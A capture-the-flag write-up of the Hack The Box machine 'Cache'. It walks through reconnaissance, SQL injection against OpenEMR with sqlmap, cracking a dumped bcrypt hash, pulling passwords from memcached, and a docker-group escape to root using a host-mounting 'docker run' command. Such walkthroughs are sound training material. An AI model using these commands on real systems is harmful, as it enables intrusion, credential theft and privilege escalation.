---
"title": "Hack The Box - Cache"
"date": 2020-10-10
"tags": ["linux", "medium", "docker.memcached", "sqli"]
"keywords": ["linux", "medium", "docker.memcached", "sqli"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "We are going to pwn Cache from Hack The Box."
"featured_image": "/img/htb-cache/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-cache/Untitled.png)

We are going to pwn Cache from Hack The Box.                                                             

Link: [https://www.hackthebox.eu/home/machines/profile/251](https://www.hackthebox.eu/home/machines/profile/251)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP:

It's an normal webpage, It contains information about Hacking. Nothing Much.

![Untitled](/img/htb-cache/Untitled%201.png)

There is a login page for us. Before Trying any SQLi, I decided to run GoBuster.

![Untitled](/img/htb-cache/Untitled%202.png)

## GoBuster Scan Results:

```bash

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.188/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/19 09:30:09 Starting gobuster
===============================================================
/javascript (Status: 301)
/jquery (Status: 301)
/server-status (Status: 403)
===============================================================
2020/05/19 10:58:27 Finished
===============================================================
```

`/jquery` There is a `js` file.

![Untitled](/img/htb-cache/Untitled%203.png)

This file reveals the username and password of the login page.

```jsx
$(function(){
    
    var error_correctPassword = false;
    var error_username = false;
    
    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){
            alert("Password didn't Match");
            error_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){
            alert("Username didn't Match");
            error_username = true;
        }
    }
    $("#loginform").submit(function(event) {
        /* Act on the event */
        error_correctPassword = false;
         checkCorrectPassword();
         error_username = false;
         checkCorrectUsername();

        if(error_correctPassword == false && error_username ==false){
            return true;
        }
        else{
            return false;
        }
    });
    
});
```

So Im logged in with `ash : H@v3_fun`

![Untitled](/img/htb-cache/Untitled%204.png)

The page is still UnderConstruction, So DeadEnd.

While checking about the Author, I came to know he have another project like cache and its called `HMS` so likewise I decided to add `hms.htb` in `/etc/hosts`

![Untitled](/img/htb-cache/Untitled%205.png)

Its an `OpenEMR` Login page.

![Untitled](/img/htb-cache/Untitled%206.png)

## GoBuster Scan Results:

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://hms.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/19 10:53:59 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin.php (Status: 200)
/common (Status: 301)
/config (Status: 301)
/contrib (Status: 301)
/controllers (Status: 301)
/custom (Status: 301)
/images (Status: 301)
/index.php (Status: 302)
/interface (Status: 301)
/javascript (Status: 301)
/library (Status: 301)
/LICENSE (Status: 200)
/modules (Status: 301)
/portal (Status: 301)
/public (Status: 301)
/server-status (Status: 403)
/services (Status: 301)
/sites (Status: 301)
/sql (Status: 301)
/templates (Status: 301)
/tests (Status: 301)
/vendor (Status: 301)
===============================================================
2020/05/19 10:55:46 Finished
===============================================================
```

`/admin.php`

![Untitled](/img/htb-cache/Untitled%207.png)

It reveals the version of the OpenEMR. So I decided to search for exploits.

> [https://www.exploit-db.com/exploits/45161](https://www.exploit-db.com/exploits/45161)

There is Reference YT link

![Untitled](/img/htb-cache/Untitled%208.png)

> [https://www.youtube.com/watch?v=DJSQ8Pk_7hc](https://www.youtube.com/watch?v=DJSQ8Pk_7hc)

By following the video,

Fill the details –

![Untitled](/img/htb-cache/Untitled%209.png)

Log In

Now Click the Register

![Untitled](/img/htb-cache/Untitled%2010.png)

Change the URL

> [http://hms.htb/portal/add_edit_event_user.php?eid=1](http://hms.htb/portal/add_edit_event_user.php?eid=1)

Here it throws some MySQL error.

![Untitled](/img/htb-cache/Untitled%2011.png)

Captured the request in burp

![Untitled](/img/htb-cache/Untitled%2012.png)

And saved it as `request.r`, Now time for SQLMap

![Untitled](/img/htb-cache/Untitled%2013.png)

There are 2 databases but `openemr` seems interesting.

I dump the tables of the database.

![Untitled](/img/htb-cache/Untitled%2014.png)

![Untitled](/img/htb-cache/Untitled%2015.png)

I dump the `users_secure`

## Getting Shell as www-data:

![Untitled](/img/htb-cache/Untitled%2016.png)

```bash
Database: openemr
Table: users_secure
[1 entry]
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
| id   | salt                           | username      | password                                                     | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
| 1    | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
```

Cracked the hash using John

```bash
root@w0lf:~/CTF/HTB/Boxes/Cache# john --wordlist=/usr/share/wordlists/rockyou.txt hash.john 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxx           (?)
1g 0:00:00:00 DONE (2020-05-19 13:41) 1.694g/s 1464p/s 1464c/s 1464C/s caitlin..felipe
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

![Untitled](/img/htb-cache/Untitled%2017.png)

## Getting User Ash:

There are 2 users `ash` and `luffy` and we already found ash password, so why don't we try su.

Before doing that make sure you have a stable shell.

`ash : H@v3_fun` it worked.

```bash
www-data@cache:/var/www/hms.htb/public_html$ python3 -c 'import pty; pty.spawn("/bin/sh")'
<html$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ su ash
su ash
Password: H@v3_fun

ash@cache:/var/www/hms.htb/public_html$ cd /home
cd /home
ash@cache:/home$ cd ash
cd ash
ash@cache:~$ ls
ls
Desktop  Documents  Downloads  Music  Pictures  Public  user.txt
ash@cache:~$ cat user.txt
cat user.txt
a4--------------------------b6b
ash@cache:~$
```

## Getting User Luffy:

There is a weird port listening inside the machine. Port `11211`

```bash
ash@cache:/home$ netstat -tulnp
netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```

I googled the port and I came to know its `memcached`

> Memcached is a general-purpose distributed memory-caching system.

> Reference : [https://www.hackingarticles.in/penetration-testing-on-memcached-server/](https://www.hackingarticles.in/penetration-testing-on-memcached-server/)

![Untitled](/img/htb-cache/Untitled%2018.png)

`stats items` reveals slab ID `1`. So we can dump it using `stats cachedump`

> **Here 1 and 0 are the parameters,
1 =** slab ID.
**0 =** It represents the number of keys you want to dump, 0 will dump all the keys present in the slab ID respectively.

I got user `luffy` password `0n3_p1ec3`

```bash
ash@cache:/home$ su luffy
su luffy
Password: 0n3_p1ec3

luffy@cache:/home$ id
id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
luffy@cache:/home$
```

## Privilege Escalation:

I run my Linux Enumeration script and it reveals

![Untitled](/img/htb-cache/Untitled%2019.png)

That `luffy` is in group docker.

In this case, the user can run a light container with `/etc` mounted in and then get root access in the container.

I used [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) and it also tells the same thing the user must be in docker group and it also tell us  how to get interactive shell.

I already got the Image ID from my enumeration script so

```bash
luffy@cache:/home/ash$ docker run -v /:/mnt --rm -it 2ca708c1c9cc chroot /mnt sh
< run -v /:/mnt --rm -it 2ca708c1c9cc chroot /mnt sh
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
ea-------------------------------a20
```

We own the box.